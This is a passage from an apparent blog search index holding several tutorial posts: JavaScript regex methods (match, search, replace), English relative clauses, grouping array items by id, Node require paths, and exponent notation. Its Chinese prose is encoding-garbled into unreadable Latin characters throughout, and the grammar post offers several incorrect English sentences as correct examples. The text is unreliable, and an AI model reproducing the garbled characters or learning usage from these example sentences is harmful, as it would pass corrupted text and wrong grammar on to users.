ä¸Š ? (/\\*.{0,100}?\\*/g)ï¼Œçµæœå°±æœƒå¾åŒ¹é…æ•¸é‡ã€Œæœ€å°‘ã€çš„é‚£å€‹é–‹å§‹æŠ“ï¼š *star* *burst* *stream* *star* ä¸­ä¸æœƒå†æœ‰å…¶ä»–èƒ½å¤ åŒ¹é…çš„å¯èƒ½ï¼Œæ‰€ä»¥æ‰èªªæ˜¯åŒ¹é…æ•¸é‡å°‘ï¼Œè€Œ *star* is simply dummy text of the *burst* and *stream* ä¸­åŒ…å«äº†æ‰€æœ‰èƒ½å¤ åŒ¹é…çš„å¯èƒ½ï¼Œæ‰€ä»¥æ‰èªªæ˜¯åŒ¹é…æ•¸é‡æœ€å¤šã€‚ ï¼ˆå› ç‚ºé€™é‚Šæœ‰ç”¨ gï¼Œé€™å€‹ä¿®é£¾å­ï¼Œæ‰€ä»¥æ‰¾åˆ°ç¬¬ä¸€å€‹å¾Œé‚„æœƒåœ¨å¾€å¾Œæ‰¾ï¼‰ å› ç‚ºå¤§éƒ¨åˆ†çš„æƒ…æ³ä¸‹æˆ‘å€‘æ‡‰è©²æœƒæ¯”è¼ƒæƒ³è¦æŠŠè³‡æ–™æ•´ç†æˆé€™æ¨£ï¼Œæ‰€ä»¥é€™å€‹æ­é… ? çš„ç”¨æ³•è¦å­¸æœƒæ€éº¼ç”¨ã€‚ æ­é… String æ–¹æ³•ä½¿ç”¨match() å›å‚³ç¬¦åˆæ¢ä»¶çš„çµæœé™£åˆ—ï¼Œæ²’æœ‰æ‰¾åˆ°ç¬¦åˆå°è±¡å›å‚³ nullã€‚ è¨­å®šã€ŒåŒ…å« 1 å€‹æ•¸å­—ã€ï¼Œã€ŒåŒ…å«è‹±æ–‡æ•¸å­—åº•ç·šã€çš„è¦å‰‡ï¼š 12345const str = 'hello'const regExpA = /\\d{1}/const regExpB = /\\w/gstr.match(regExpA) // nullstr.match(regExpB) // ['h', 'e', 'l', 'l', 'o'] search() å›å‚³ç¬¬ä¸€å€‹ç¬¦åˆæ¢ä»¶å°è±¡çš„ç´¢å¼•å€¼ï¼Œæ²’æœ‰æ‰¾åˆ°ç¬¦åˆå°è±¡å›å‚³ -1ã€‚ è¨­å®šã€ŒåŒ…å« 1 å€‹æ•¸å­—ã€ï¼Œã€ŒåŒ…å« hã€çš„è¦å‰‡ï¼š 12345const str = 'hello'const regExpA = /\\d{1}/const regExpB = /\\h/str.search(regExpA) // -1str.search(regExpB) // 0 replace() æŠŠç¬¦åˆæ¢ä»¶çš„å°è±¡çš„å€¼åšæ›¿æ›ï¼Œæ²’æœ‰ç¬¦åˆçš„å°è±¡å°±å›å‚³åŸå­—ä¸²ã€‚æ¥æ”¶å…©å€‹åƒæ•¸ï¼Œç¬¬ä¸€å€‹æ˜¯æ­£è¦è¡¨é”å¼ï¼Œç¬¬äºŒå€‹æ˜¯è¦æ›¿æ›çš„å€¼ã€‚ è¨­å®šã€ŒåŒ…å«ä»»æ„æ•¸å­—ã€ï¼Œã€ŒåŒ…å«ä»»æ„è‹±æ–‡æ•¸å­—åº•ç·šã€çš„è¦å‰‡ï¼š 12345const str = 'hello'const regExpA = /\\d/const regExpB = /\\w/str.replace(regExpA, 1) // 'hello'str.replace(regExpB, 1) // '1ello' ä¸€äº›åŸºç¤ç¯„ä¾‹è¨­å®šã€Œèµ·å§‹å­—ä¸²ç‚º abã€çš„è¦å‰‡ï¼š 123const regExp = /^ab/regExp.test('abcdefg') // trueregExp.test('cccabc') // false è¨­å®šã€Œçµå°¾å­—ä¸²ç‚º abã€çš„è¦å‰‡ï¼š 123const regExp = /ab$/regExp.test('abcdefg') // falseregExp.test('cccab') // true è¨­å®šã€ŒåŒ…å« ab è£¡å¤¾ä¸€å€‹ä»»æ„å­—å…ƒã€çš„è¦å‰‡ï¼š 123const regExp = /a.b/regExp.test('a1234b') // falseregExp.test('aMb') // true æ³¨æ„ä¸€å€‹ . ä»£è¡¨çš„æ˜¯ä¸€å€‹å­—å…ƒã€‚ è¨­å®šã€ŒåŒ…å« ä»»ä½•æ•¸å­—ã€çš„è¦å‰‡ï¼š 1234const regExp = /\\d/regExp.test('123456') // trueregExp.test('abc') // falseregExp.test('abc123') // true è¨­å®šã€ŒåŒ…å« ä»»ä½•è‹±æ–‡æ•¸å­—åº•ç·šã€çš„è¦å‰‡ï¼š 12345const regExp = /\\w/regExp.test('123456') // trueregExp.test('abc') // trueregExp.test('abc123') // trueregExp.test('?') // false è¨­å®šã€ŒåŒ…å« ä»»ä½•ç©ºç™½å­—å…ƒã€çš„è¦å‰‡ï¼š 1234const regExp = /\\s/regExp.test('1 2 3') // trueregExp.test('a b c') // trueregExp.test('?') // false è¨­å®šã€ŒåŒ…å« a æˆ– b ã€çš„è¦å‰‡ï¼š 1234const regExp = /a|b/regExp.test('123') // falseregExp.test('ac') // trueregExp.test('bc') // true è¨­å®šã€ŒåŒ…å« 1 åˆ° 5ã€çš„è¦å‰‡ï¼š 123const regExp = /[1-5]/regExp.test('1239') // trueregExp.test('6') // false æƒ³å­¸æ›´å¤šå¯ä»¥åƒè€ƒçš„æ–‡ç«  Day 24: æ­£è¦è¡¨é”å¼ åƒè€ƒè³‡æ–™Day30 ä»€éº¼æ˜¯ RegExp æ­£å‰‡è¡¨é”å¼ ï¼Ÿåäº”åˆ†é˜èªè­˜æ­£è¦è¡¨é”å¼ï¼Œè§£æ±ºæ‰€æœ‰æ–‡å­—é›£é¡Œä¸å¯è¦‹å­—å…ƒçš„å‘","link":"/2021/12/15/regular-expression/"},{"title":"whichï¼Ÿthatï¼Ÿé—œä¿‚å­å¥ï¼Ÿ","text":"ç”±æ–¼é—œä¿‚å­å¥åœ¨æ‡‰è©²æ˜¯ä¸€å€‹å¾ˆå¸¸è¦‹åˆ°çš„å¥å‹ï¼Œå°±æ˜¯æœƒå†’å‡ºä¸€å † which / that / who ç­‰ç­‰çš„é‚£ç¨®å¥å­ã€‚ é›–ç„¶å®ƒçš„åŸºæœ¬æ¦‚å¿µä¸ç®—å¤ªè¤‡é›œï¼Œä½†æœ‰ç¤™æ–¼ç¯‡å¹…æ¯”è¼ƒé•·ï¼Œæ‰€ä»¥æˆ‘è¦ºå¾—é‚„æ˜¯æŠŠå®ƒç¨ç«‹å‡ºä¾†ç•¶æˆä¸€ç¯‡æ–‡ç« ä¾†èªªæ˜æœƒæ¯”è¼ƒæ¸…æ¥šã€‚ å…ˆèªè­˜é—œä¿‚å­å¥æ˜ç¢ºçš„å®šç¾©å¤§æ¦‚æ˜¯é€™æ¨£å­ï¼š é—œä¿‚å­å¥æ˜¯ç”±é—œä¿‚ä»£åè©(who, whom, whose, which, that)æˆ–é—œä¿‚å‰¯è©(when, where, why)æ‰€å¼•å°çš„å½¢å®¹è©å­å¥ã€‚ å…ˆåˆ¥åæ§½ï¼Œæˆ‘çŸ¥é“å¤§éƒ¨åˆ†çš„äººéƒ½ä¸æœƒå¾æŸå€‹æ±è¥¿çš„å®˜æ–¹å®šç¾©å»ç†è§£å®ƒçš„æ„æ€ï¼Œä¸ç„¶æˆ‘å€‘å°±ä¸éœ€è¦ä¸Šå­¸ï¼Œä¹Ÿä¸éœ€è¦è€å¸«äº†ã€‚ ä¸éä½ å¯ä»¥æŠ“é‡é»å‡ºä¾†çœ‹ï¼Œæ ¹æ“šå®šç¾©ï¼Œæˆ‘å€‘è‡³å°‘èƒ½çŸ¥é“ï¼Œé—œä¿‚å­å¥å°±æ˜¯ç”±é—œä¿‚ä»£åè©ã€é—œä¿‚å‰¯è©é€™å…©å€‹æ±è¥¿ä¾†çµ„æˆçš„ä¸€å€‹ ã€Œå¥å­ã€ ï¼Œè€Œé€™å€‹å¥å­çš„ä½œç”¨å°±æ˜¯ ã€Œæ‹¿ä¾†å½¢å®¹æŸå€‹ä½ è¦è¬›çš„æ±è¥¿ã€ã€‚ ä¾†çœ‹ä¸€äº›ä¾‹å­ï¼š I found a bug which is a SyntaxError.æˆ‘æ‰¾åˆ°äº†ä¸€å€‹èªæ³•éŒ¯èª¤çš„ bug ä½ å¯ä»¥æŠŠé€™å€‹å¥å­çœ‹æˆæ˜¯é€™æ¨£å­ï¼š I found a bug which is a SyntaxError. è¦å½¢å®¹çš„æ±è¥¿ é—œä¿‚ä»£åè© â€œwhich is a SyntaxErrorâ€ é€™æ•´å¥è©±å°±æ˜¯ã€Œé—œä¿‚å­å¥ã€ï¼Œç”¨ä¾†å½¢å®¹ä½ å‰é¢èªªçš„é‚£å€‹ bug ã€‚ â€œwhichâ€ æ˜¯ã€Œé—œä¿‚ä»£åè©ã€ï¼Œåœ¨æ­¤è™•å®ƒæœ‰å…©å€‹ä½œç”¨ï¼š ç•¶ä½œ bug é€™å€‹è©çš„ä»£åè© é€£çµå‰é¢çš„å¥å­ æ‰€ä»¥ä¸€å€‹å®Œæ•´çš„é—œä¿‚å­å¥å°±å¤§æ¦‚æ˜¯é•·é€™å€‹æ¨£å­ï¼Œè€Œå®ƒåˆåŒ…å«äº†é—œä¿‚ä»£åè©èˆ‡é—œä¿‚å‰¯è©é€™å…©å€‹æ±è¥¿ï¼Œä¸»è¦ç”¨é€”æ˜¯ä¾†å¹«åŠ©ä½ é€£æ¥å‰é¢çš„å¥å­ã€‚ æ‰€ä»¥æœ€åŸºæœ¬çš„ï¼Œä½ è¦èƒ½åˆ†è¾¨ä»€éº¼æ™‚å€™ç”¨å“ªå€‹è©ï¼Œå¯ä»¥åƒè€ƒä»¥ä¸‹è¡¨æ ¼ï¼š é—œä¿‚ä»£åè© é—œä¿‚å‰¯è© ç”¨è© who / whom / whose / which / that when / where / why æ™‚æ©Ÿ æŒ‡æŸå€‹äººã€äº‹ã€ç‰© æŒ‡æŸå€‹æ™‚é–“ã€åœ°é»ã€åŸå›  ç”¨é€” ç•¶ä½œä»£åè©ã€é€£æ¥å¥å­ é€£æ¥å¥å­ å¦‚æœä½ ä¸æ¸…æ¥š who / whom / whose / which / that çš„å·®åˆ¥ï¼Œè«‹åƒè€ƒé€™è£¡ã€‚ ç°¡å–®ä¾†èªªã€‚å¦‚æœè¦å½¢å®¹çš„æ±è¥¿æ˜¯æŒ‡æŸå€‹äººã€äº‹ã€ç‰©ï¼Œé‚£å°±ç”¨é—œä¿‚ä»£åè©ã€‚åä¹‹ï¼Œå¦‚æœè¦å½¢å®¹çš„æ±è¥¿æ˜¯æŒ‡æ™‚é–“ã€åœ°é»ã€åŸå› ï¼Œé‚£å°±æ”¹ç”¨é—œä¿‚å‰¯è©ã€‚ä»¥å‰›å‰›çš„ä¾‹å­ä¾†èªªï¼Œå› ç‚ºè¦å½¢å®¹çš„æ±è¥¿æ˜¯ â€œbugâ€ ï¼Œæ‰€ä»¥å°±ç”¨é—œä¿‚ä»£åè©ã€‚ å¦‚æœæ˜¯é—œä¿‚å‰¯è©çš„è©±ï¼Œæœƒåƒé€™æ¨£ï¼š I remember the day when I first read JavaScript.æˆ‘è¨˜å¾—æˆ‘ç¬¬ä¸€æ¬¡è®€ JavaScript çš„é‚£ä¸€å¤©ã€‚ This is the company where I met him yesterday.é€™æ˜¯æˆ‘æ˜¨å¤©é‡åˆ°ä»–çš„é‚£å®¶å…¬å¸ã€‚ That is the reason why I recommand arrow function instead of normal function.é€™å°±æ˜¯æˆ‘ç‚ºä»€éº¼æ¨è–¦ç®­é ­å‡½å¼è€Œä¸æ˜¯ä¸€èˆ¬å‡½ç¤ºçš„åŸå› ã€‚ I remember the day when I first read JavaScript è¦å½¢å®¹çš„æ±è¥¿ é—œä¿‚å‰¯è© This is the company where I met him yesterday è¦å½¢å®¹çš„æ±è¥¿ é—œä¿‚å‰¯è© That is the reason why I recommand arrow function instead of normal function è¦å½¢å®¹çš„æ±è¥¿ é—œä¿‚å‰¯è© è©¦è‘—å»ç†è§£é€™å€‹æ¦‚å¿µï¼Œæœƒæ¯”åˆ»æ„å»æ­»è¨˜ä¾†å¾—å®¹æ˜“ï¼Œä¹Ÿä¸éœ€è¦ç‰¹åˆ¥å»è¨˜æ†¶ã€‚å°±å¥½æ¯”æˆ‘å€‘è¬›ä¸­æ–‡çš„æ™‚å€™ä¹Ÿæœƒæ‹¿é©ç•¶çš„è©èªä¾†å½¢å®¹æŸå€‹æ±è¥¿ï¼Œè‹±æ–‡ä¹Ÿä¸€æ¨£ï¼Œä¸ç”¨æƒ³çš„å¤ªè¤‡é›œã€‚ ç‚ºä»€éº¼éœ€è¦é—œä¿‚å­å¥ï¼Ÿç•¶ä½ æƒ³ä¸é€šä¸€äº›æ±è¥¿æ™‚ï¼Œæˆ‘å¾ˆæ¨è–¦å¤§å®¶å»é€™æ¨£æ€è€ƒã€‚ ç‚ºä»€éº¼è¦æœ‰é€™å€‹æ±è¥¿çš„å­˜åœ¨ï¼Ÿå¦‚æœé€™å€‹æ±è¥¿ä¸å­˜åœ¨çš„è©±æœƒæœ‰ä»€éº¼å•é¡Œï¼Ÿ ç•¶ä½ èƒ½å›ç­”å‡ºé€™å…©ä»¶äº‹çš„æ™‚å€™ï¼Œé€šå¸¸å°±èƒ½æƒ³é€šï¼Œä¸æœƒåœ¨æ„Ÿåˆ°å›°æƒ‘äº†ã€‚æ‰€ä»¥è®“æˆ‘å€‘ä¾†è¨è«–çœ‹çœ‹ï¼Œç‚ºä»€éº¼è¦æœ‰é—œä¿‚å­å¥ï¼Œä»¥åŠæ²’æœ‰é—œä¿‚å­å¥çš„è©±æœƒæœ‰ä»€éº¼å•é¡Œï¼Ÿ æ—¢ç„¶æˆ‘å€‘å·²ç¶“çŸ¥é“ï¼Œé—œä¿‚å­å¥çš„ä½œç”¨åªæ˜¯æ‹¿ä¾†å½¢å®¹ä¸€å€‹æ±è¥¿çš„å¥å­è€Œå·²ã€‚ä¸çŸ¥é“ä½ æœƒä¸æœƒç–‘æƒ‘ï¼Œç‚ºä»€éº¼ä¸ç›´æ¥æ‹¿ä¸€èˆ¬çš„å½¢å®¹è©ä¾†å½¢å®¹å°±å¥½äº†ï¼Ÿå…¶å¯¦ä½ ä»”ç´°æƒ³æƒ³ï¼Œæœƒç™¼ç¾ä¸¦ä¸æ˜¯æ¯å€‹æƒ…å¢ƒä¸‹ï¼Œæˆ‘å€‘éƒ½æœ‰é©åˆçš„å½¢å®¹è©ä¾†ä¿®é£¾æˆ‘å€‘æƒ³è¡¨é”çš„æ±è¥¿ã€‚ ä¾‹å¦‚ï¼š æœ‰é©åˆçš„å½¢å®¹è©æ™‚I love the newly-opened restaurant. æˆ‘è¶…æ„›é‚£å®¶æ–°é–‹çš„é¤å»³ æ²’æœ‰é©åˆçš„å½¢å®¹è©æ™‚I love the restarant that Tom recommand. æˆ‘è¶…æ„›é‚£å®¶ Tom æ¨è–¦çš„é¤å»³ ä½ å¯ä»¥çœ‹åˆ°ç¬¬äºŒå€‹å¥å­å¾ˆæ˜é¡¯åœ°ï¼Œä»–åªèƒ½é‚£æ¨£å­å»å½¢å®¹ã€‚ æ‰€ä»¥ç‚ºä»€éº¼éœ€è¦é—œä¿‚å­å¥ï¼Ÿï¼Œç†ç”±å¾ˆç°¡å–®ï¼Œ å› ç‚ºä½ æ‰¾ä¸åˆ°å¯ä»¥ç”¨çš„å½¢å®¹è©ã€‚ è£œå……ï¼šæœ‰äº›æ™‚å€™å¯ä»¥çœç•¥é—œä¿‚ä»£åè©ç•¶é—œä¿‚ä»£åè©åœ¨é—œä¿‚å­å¥ä¸­ç•¶ä½œå—è©çš„æ™‚å€™ï¼Œå¯ä»¥çœç•¥ï¼Œåä¹‹ï¼Œå¦‚æœåœ¨é—œä¿‚å­å¥ä¸­ç•¶ä½œä¸»è©çš„æ™‚å€™ï¼Œä¸èƒ½è¢«çœç•¥ã€‚ ä¾‹å¦‚ï¼š I love the restaurant (that) Tom recommended. é€™è£¡çš„ that ä½œç‚ºï¼ˆTom recommendedï¼‰çš„å—è© I love the restaurant that has a big signboard. é€™è£¡çš„ that ä½œç‚ºï¼ˆhas a big signboardï¼‰çš„ä¸»è© è£œå……ï¼šä»¥ what ä¾†é€£çµçš„å¥å­æ˜¯é—œä¿‚å­å¥å—ï¼Ÿä¸æ˜¯ï¼Œwhat æ‰€å¼•å°çš„æ˜¯åè©å­å¥ï¼Œä¸åƒé—œä¿‚å­å¥æ˜¯å½¢å®¹è©å­å¥ã€‚æ‰€ä»¥æ›å¥è©±èªªï¼Œé€™æ•´å¥è©±åªæ˜¯ä¸€å€‹ç”¨ä¾†æ¥å—æŸå€‹å‹•ä½œçš„ ã€Œå—è©ã€ã€‚æ—¢ç„¶æ˜¯å€‹å—è©ï¼Œå°±èªªæ˜ä»–ä¸¦ä¸æ˜¯é—œä¿‚å­å¥ã€‚ ä¾‹å¦‚ï¼š I donâ€™t know what are you talking about.æˆ‘ä¸çŸ¥é“ä½ åœ¨èªªä»€éº¼ã€‚ â€œwhat are you talking aboutâ€ é€™ä¸€æ•´å¥è©±æœƒçœ‹åšæ˜¯ know é€™å€‹å‹•ä½œçš„ã€Œå—è©ã€ã€‚ é™å®šé—œä¿‚å­å¥ vs éé™å®šé—œä¿‚å­å¥é€™é‚Šå°±åªæ˜¯åœ¨åšå€‹å»¶ä¼¸ï¼Œä½ å¯ä»¥å¤§è‡´äº†è§£ä¸€ä¸‹ï¼Œä½†çœŸçš„å¼„ä¸æ‡‚çš„è©±ä¹Ÿæ²’é—œä¿‚ã€‚ ç•¶é—œä¿‚å­å¥æ˜¯ä½¿ç”¨é—œä¿‚ä»£åè©æ™‚ï¼Œå¯ä»¥åœ¨å€åˆ†æˆ ã€Œé™å®šé—œä¿‚å­å¥ã€ èˆ‡ ã€Œéé™å®šé—œä¿‚å­å¥ã€ éé™å®šé—œä¿‚å­å¥ï¼ˆæ±è¥¿å¯èƒ½æ˜¯å–®å€‹æˆ–æ˜¯å¤šå€‹ï¼Œä½†ä¸é™å®šç¯„åœï¼‰ æˆ‘ä¸é™å®šæ˜¯å“ªäº›æ±è¥¿ï¼Œå› ç‚ºæ±è¥¿åªæœ‰ä¸€å€‹ï¼Œæˆ–æˆ‘æŒ‡çš„æ˜¯æ‰€æœ‰çš„ã€‚ ä¸ç”¨ç‰¹åˆ¥æŒ‡å‡ºï¼Œå¤§å®¶éƒ½å¾ˆæ¸…æ¥šé‚£æ˜¯ä»€éº¼æ±è¥¿ã€‚ å°æ±è¥¿æä¾›é¡å¤–çš„è³‡è¨Šä¾†è£œå……èªªæ˜ã€‚ æ‹¿æ‰çš„è©±ï¼Œå°æ–¹é‚„æ˜¯çŸ¥é“ä½ æ˜¯æŒ‡ä»€éº¼æ±è¥¿ã€‚ éœ€è¦ä»¥ â€œé€—è™Ÿâ€ ä¾†åˆ†éš”å¥å­ã€‚ ä¾‹å¦‚ï¼š I have a brother, who work at Japan.æˆ‘æœ‰ä¸€å€‹åœ¨æ—¥æœ¬å·¥ä½œçš„å“¥å“¥ ä»£è¡¨ä½ åªæœ‰ä¸€å€‹å“¥å“¥ã€‚ work at Japan åªæ˜¯è£œå……é¡å¤–çš„è³‡è¨Šï¼Œèªªæ˜å“¥å“¥åœ¨æ—¥æœ¬å·¥ä½œã€‚ å³ä¾¿å°‘äº†è£œå……èªªæ˜ï¼Œåˆ¥äººä¹ŸçŸ¥é“ä½ åœ¨æŒ‡å“ªä½ï¼ˆå› ç‚ºä½ åªæœ‰ä¸€å€‹å“¥å“¥ï¼‰ã€‚ Gorillas, which are large and originate in Africa, can sometimes be found in zoos.å¤§çŒ©çŒ©å¾ˆé¾å¤§ä¸”èµ·æºæ–¼éæ´²ï¼Œæœ‰æ™‚å€™åœ¨å‹•ç‰©åœ’å¯ä»¥çœ‹åˆ°ã€‚ ä»£è¡¨ä½ æŒ‡çš„æ˜¯æ‰€æœ‰å¤§çŒ©çŒ©ï¼ˆæ³¨æ„å­—å°¾æœ‰ sï¼‰é€™å€‹ç¾¤é«”ï¼Œ which are large and originate in Africaï¼Œåªæ˜¯è£œå……é¡å¤–çš„è³‡è¨Šï¼Œèªªæ˜å¤§çŒ©çŒ©çš„é«”å‹èˆ‡èµ·æºã€‚ å¦‚æœçœç•¥æ‰ï¼Œä¹Ÿä¸å½±éŸ¿æ•´å€‹å¥å­åŠèªæ„ã€‚ é™å®šé—œä¿‚å­å¥ï¼ˆæ±è¥¿åœ¨ä¸€å€‹ç¯„åœä¸­ï¼Œä½†é™å®šæŒ‡å®šçš„ç¯„åœï¼‰ æˆ‘æŒ‡çš„æ±è¥¿ä¸€å®šæœ‰ä¸€å€‹ä»¥ä¸Šï¼Œæ‰€ä»¥æˆ‘å¿…é ˆæŒ‡å‡ºæ˜¯å“ªä¸€å€‹ï¼Œæˆ–å“ªå€‹ç¯„åœã€‚ åœ¨ä¸€å€‹æŸå€‹ç¯„åœæŒ‡ä¸€äº›ç‰¹å®šçš„æ±è¥¿ï¼ˆä»£è¡¨æœ‰å¾ˆå¤šå€‹ï¼‰ æ‹¿æ‰çš„è©±ï¼Œå°æ–¹æœƒä¸çŸ¥é“æ˜¯æŒ‡ä»€éº¼æ±è¥¿ æœ‰é€™äº›è³‡è¨Šæ‰èƒ½è®“å¥å­å®Œæ•´ ä¾‹å¦‚ï¼š I have a brother who work at Japan.æˆ‘æœ‰ä¸€å€‹åœ¨æ—¥æœ¬å·¥ä½œçš„å“¥å“¥ ä»£è¡¨ä½ æœ‰ä¸€å€‹ä»¥ä¸Šçš„å“¥å“¥ï¼Œè€Œä½ èªªçš„æ˜¯åœ¨æ—¥æœ¬å·¥ä½œé‚£ä½ã€‚ ä½ æœ‰å¾ˆå¤šå€‹å“¥å“¥ï¼Œæ‰€ä»¥ work at Japan æ˜¯ä¸€å€‹å¿…è¦çš„è³‡è¨Šï¼Œå¦‚æœæ‹¿æ‰åˆ¥äººæœƒä¸çŸ¥é“ä½ åœ¨èªªèª°ã€‚ Gorillas which name are Orangutan can sometimes be found in zoos.åå­—å« Orangutan çš„çŒ©çŒ©ï¼Œæœ‰æ™‚å€™å¯ä»¥åœ¨å‹•ç‰©åœ’çœ‹åˆ°ã€‚ ä½ æŒ‡çš„æ˜¯åå­å«åš Orangutan çš„å¤§çŒ©çŒ©ã€‚ æ‹¿æ‰çš„è©±ï¼Œé›–ç„¶ä¸å½±éŸ¿å¥å­ï¼Œä½†æœƒå½±éŸ¿èªæ„ï¼Œå› ç‚ºåˆ¥äººåªçŸ¥é“ä½ æ˜¯èªªæ‰€æœ‰çš„å¤§çŒ©çŒ©ï¼Œè€Œä¸æ˜¯åå­—ç‚º â€œOrangutanâ€ çš„å¤§çŒ©çŒ©ã€‚ åšå€‹å½™æ•´ é™å®šé—œä¿‚å­å¥ éé™å®šé—œä¿‚å­å¥ ç”¨é€” æä¾›å®Œæ•´çš„è³‡è¨Š è£œå……é¡å¤–çš„è³‡è¨Š è‹¥çœç•¥æ˜¯å¦æœƒå½±éŸ¿å¥å­ æ˜¯ å¦ æ˜¯å¦éœ€è¦é€—è™Ÿ å¦ æ˜¯ æ˜¯å¦èƒ½çœç•¥é—œä¿‚ä»£åè© æ˜¯ å¦ æ˜¯å¦å¯ä»¥ç”¨ that æ˜¯ å¦ åƒè€ƒè³‡æ–™å¯¦ç”¨åŸºç¤æ–‡æ³•ï¼ˆé—œä¿‚å­å¥ï¼‰å¯¦ç”¨åŸºç¤æ–‡æ³•ï¼ˆé—œä¿‚ä»£åè©ï¼‰éé™å®šé—œä¿‚å­å¥ | è‹±èªæ–‡æ³• | EFé™å®šé—œä¿‚å­å¥ | è‹±èªæ–‡æ³• | EFæ–‡æ³•æ•™å®¤ã€‘é™å®šèˆ‡éé™å®šé—œä¿‚ä»£åè©ã€è‹±æ–‡æ–‡æ³•ã€‘é™å®šå’Œéé™å®šç”¨æ³• é€™ä¸€ç¯‡æ•™ä½ å¦‚ä½•æ¸…æ¥šåˆ†è¾¦ï¼ - Engoo ç·šä¸Šè‹±æ–‡å®¶æ•™-éƒ¨è½æ ¼é¢¨å‚³åª’ï¼what æ˜¯é—œä¿‚ä»£åè©å—ï¼Ÿ","link":"/2021/07/11/relative-clauses/"},{"title":"JavaScript æ•´ç†è³‡æ–™çš„ç¯„ä¾‹","text":"å¾—å¤šåŠ å¼·é€™éƒ¨åˆ†çš„èƒ½åŠ›ã€‚ ç°¡è¿°é€™æ˜¯ä¾†è‡ª Lidemy ç¬¬äº”æœŸæœŸä¸­æ¸¬é©— çš„é¡Œç›®ã€‚åšå®Œå¾Œç™¼ç¾æˆ‘å°ã€Œè³‡æ–™æ•´ç†ã€çš„éƒ¨åˆ†ä¸å¤ ç†Ÿï¼Œæ‰€ä»¥æƒ³è¨˜éŒ„ä¸‹ä¾†ã€‚ é¡Œç›®ï¼šçµ¦ä½ ä¸€ç­†è³‡æ–™ï¼š 1234567891011[ {id: 1, value: 43}, {id: 1, value: 213}, {id: 2, value: 321}, {id: 3, value: 2}, {id: 3, value: 345}, {id: 4, value: 555}, {id: 4, value: 44}, {id: 3, value: 33}, {id: 3, value: 199},] è«‹æ•´ç†æˆé€™æ¨£ï¼š 123456[ {id: 1, value: [43, 213]}, {id: 2, value: 321}, {id: 3, value: [2, 345, 33, 199]}, {id: 4, value: [555, 44]}] ç°¡å–®ä¾†èªªå°±æ˜¯ã€ŒæŠŠé‡è¤‡å‡ºç¾ id çš„è®Šæˆä¸€å€‹ï¼Œè€Œå€¼è¦æ˜¯ value æ¹Šæˆçš„é™£åˆ—ï¼ˆæˆ–å–®ä¸€å€¼ï¼‰ã€ é™„è¨»ï¼šé †åºä¸å¯ä»¥æ”¹è®Šï¼Œä¾‹å¦‚åŸæœ¬æ˜¯ 2 =&gt; 1 =&gt; 3 çš„è©±çµæœä¹Ÿè¦æ˜¯å…ˆ 2 =&gt; 1 =&gt; 3 é€™æ¨£æ’ã€‚ æ€è·¯é€™é¡Œå¯ä»¥é€™æ¨£å­æƒ³ï¼š å…ˆå»ºç«‹ä¸€å€‹ç‰©ä»¶ï¼ŒæŠŠæ¯å€‹ id å‡ºç¾çš„ value çµ¦å­˜èµ·ä¾† éæ­·å‰›å‰›å»ºå¥½çš„ç‰©ä»¶ï¼Œå†æ•´ç†æˆæœ€å¾Œçš„æ ¼å¼ 1234567891011121314151617181920212223242526272829303132333435363738394041424344function solve(arr) { const result = []; // ç¬¬ä¸€æ­¥ï¼šæŠŠæ¯å€‹ id å°æ‡‰çš„ value å­˜èµ·ä¾† const valuesObject = retrieveValues(arr); // ç¬¬äºŒæ­¥ï¼šéæ­·ç‰©ä»¶ï¼Œé‡æ–°æ•´ç† for (let key in valuesObject) { if (valuesObject[key].length === 1) { // åªæœ‰ä¸€å€‹ value å°±æŠŠé™£åˆ—æ‹¿æ‰ result.push({ id: Number(key), value: valuesObject[key][0] }) } else { result.push({ id: Number(key), value: valuesObject[key] }) } } return result;}function retrieveValues(arr) { /* é æœŸç”¢å‡ºï¼š{ ' 1': [30, 22], ' 2': [100], ' 3': [33, 55] } */ const collection = {}; // é™„è¨»ï¼šé€™é‚Šå­˜ ' 1' æ˜¯å› ç‚ºç”¨ '1' æœƒè¢«è½‰æˆã€Œæ•¸å­—ã€é‡æ–°æ’åºï¼Œ // ä¾‹å¦‚åŸæœ¬ {'5' : 1, '1': 2} è®Šæˆ {'1': 2, '5': 1}ï¼Œ // æ‰€ä»¥ä¸€å®šè¦åŠ ä¸Šç©ºæ ¼ï¼Œæ‰ä¸æœƒè¢«è½‰æˆæ•¸å­— for (const item of arr) { // å·²å­˜åœ¨çš„ id å°±ç›´æ¥ push if (' ' + item.id in collection) { collection[' ' + item.id].push(item.value) } else { // ä¸å­˜åœ¨å°±å»ºä¸€å€‹æ–°çš„ collection[' ' + item.id] = [item.value] } } return collection} æˆ‘ä¹Ÿä¸çŸ¥é“ç‚ºä»€éº¼ä¸€é–‹å§‹æ²’æœ‰æƒ³åˆ°é€™ç¨®è§£æ³•ï¼Œå¯èƒ½æˆ‘çœŸçš„å¤ªä¹…æ²’åšé¡Œç›®äº†å§ QQ","link":"/2022/03/17/reorganize-data/"},{"title":"å¼•ç”¨æ¨¡çµ„çš„æ³¨æ„äº‹é …","text":"æ€•æœªä¾†çš„æŸä¸€å¤©è‡ªå·±æœƒè¸©åˆ°é€™å€‹é›·ã€‚ ./ å¾ˆé‡è¦å¦‚æœä½ è¦å¼•å…¥çš„æ˜¯ã€Œè‡ªå·±å¯«å¥½çš„æ¨¡çµ„ã€ï¼Œè«‹å‹™å¿…åŠ ä¸Š ./ï¼ˆæ ¹ç›®éŒ„è³‡æ–™å¤¾ï¼‰çš„ç›¸å°è·¯å¾‘ï¼š 123// .js å¯åŠ å¯ä¸åŠ ï¼Œä½†å¤§éƒ¨åˆ†æƒ…æ³ä¸æœƒåŠ var myModule = require('./myModule') var myModule = require('./myModule.js') åä¹‹ï¼Œå¦‚æœä½ å¼•å…¥çš„æ˜¯å¾ npm ä¸Šä¸‹è¼‰çš„æ¨¡çµ„ï¼Œæˆ–æ˜¯ç³»çµ±å…§å»ºçš„æ¨¡çµ„ï¼Œå°±åˆ¥åŠ  ./ï¼š 12var leftPad = require('left-pad') // å¾ npm ä¸Šä¸‹è¼‰çš„var OS = require('os') // å…§å»ºæ¨¡çµ„","link":"/2021/12/23/require-module-problem/"},{"title":"JavaScript ä¸­çš„ç§‘å­¸è¨˜è™Ÿè¡¨ç¤ºæ³•","text":"å†·çŸ¥è­˜ï½ å¯ä»¥é€™æ¨£ä¾†è¡¨ç¤ºe å¾Œé¢çš„æ•¸å­—ä»£è¡¨å¹¾å€‹ 0 10 = 1e1 100 = 1e2 1000 = 1e3 â€¦","link":"/2021/12/26/scientific-notation/"},{"title":"å†æ¬¡ç†è§£ä»€éº¼æ˜¯ä½œç”¨åŸŸï¼Ÿ","text":"ä¸€å®šè¦æŠŠå®ƒå¼„æ‡‚ã€‚ 